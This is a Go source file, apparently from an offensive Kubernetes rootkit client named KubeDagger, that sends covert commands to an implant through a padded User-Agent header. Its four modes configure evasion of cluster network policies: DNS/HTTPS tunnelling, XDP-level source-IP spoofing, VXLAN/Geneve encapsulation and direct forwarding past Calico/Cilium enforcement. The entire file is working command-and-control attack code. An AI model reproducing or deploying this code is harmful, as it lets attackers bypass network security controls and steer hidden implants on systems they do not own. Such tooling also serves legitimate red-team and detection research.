package netbypass

import (
	"encoding/json"
	"fmt"
	"net/http"
	"os"

	"github.com/yasindce1998/KubeDagger/cmd/kubedagger-client/run/model"
)

type BypassResult struct {
	Mode    string     `json:"mode"`
	DestIP  string     `json:"dest_ip"`
	DestPort string    `json:"dest_port"`
	Status  string     `json:"status"`
	Detail  string     `json:"detail"`
}

func Execute(target, mode, destIP, destPort, output string) error {
	var result *BypassResult

	switch mode {
	case "tunnel":
		result = configureTunnel(target, destIP, destPort)
	case "spoof":
		result = configureSpoof(target, destIP, destPort)
	case "encap":
		result = configureEncap(target, destIP, destPort)
	case "direct":
		result = configureDirect(target, destIP, destPort)
	default:
		return fmt.Errorf("unsupported bypass mode: %s (use tunnel, spoof, encap, or direct)", mode)
	}

	data, _ := json.MarshalIndent(result, "", "  ")
	if output != "" {
		return os.WriteFile(output, data, 0644)
	}
	fmt.Println(string(data))
	return nil
}

func configureTunnel(target, destIP, destPort string) *BypassResult {
	cmd := fmt.Sprintf("bypass_tunnel#%s#%s", destIP, destPort)
	status := sendBypassCommand(target, cmd)
	return &BypassResult{
		Mode:     "tunnel",
		DestIP:   destIP,
		DestPort: destPort,
		Status:   status,
		Detail:   "encapsulate blocked TCP in DNS/HTTPS to bypass L4 network policies",
	}
}

func configureSpoof(target, destIP, destPort string) *BypassResult {
	cmd := fmt.Sprintf("bypass_spoof#%s#%s", destIP, destPort)
	status := sendBypassCommand(target, cmd)
	return &BypassResult{
		Mode:     "spoof",
		DestIP:   destIP,
		DestPort: destPort,
		Status:   status,
		Detail:   "rewrite source IP at XDP level to appear as allowed pod",
	}
}

func configureEncap(target, destIP, destPort string) *BypassResult {
	cmd := fmt.Sprintf("bypass_encap#%s#%s", destIP, destPort)
	status := sendBypassCommand(target, cmd)
	return &BypassResult{
		Mode:     "encap",
		DestIP:   destIP,
		DestPort: destPort,
		Status:   status,
		Detail:   "wrap traffic in VXLAN/Geneve to bypass CNI-enforced network policies",
	}
}

func configureDirect(target, destIP, destPort string) *BypassResult {
	cmd := fmt.Sprintf("bypass_direct#%s#%s", destIP, destPort)
	status := sendBypassCommand(target, cmd)
	return &BypassResult{
		Mode:     "direct",
		DestIP:   destIP,
		DestPort: destPort,
		Status:   status,
		Detail:   "XDP direct forwarding bypasses TC-layer Calico/Cilium enforcement",
	}
}

func sendBypassCommand(target, command string) string {
	ua := buildBypassUserAgent(command)

	req, err := http.NewRequest("GET", target+"/net_bypass", nil)
	if err != nil {
		return "error: " + err.Error()
	}
	req.Header.Set("User-Agent", ua)

	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		return "error: " + err.Error()
	}
	defer resp.Body.Close()

	if resp.StatusCode == http.StatusOK {
		return "configured"
	}
	return fmt.Sprintf("failed (HTTP %d)", resp.StatusCode)
}

func buildBypassUserAgent(command string) string {
	userAgent := command
	for len(userAgent) < model.UserAgentPaddingLen {
		userAgent += "#"
	}
	return userAgent
}
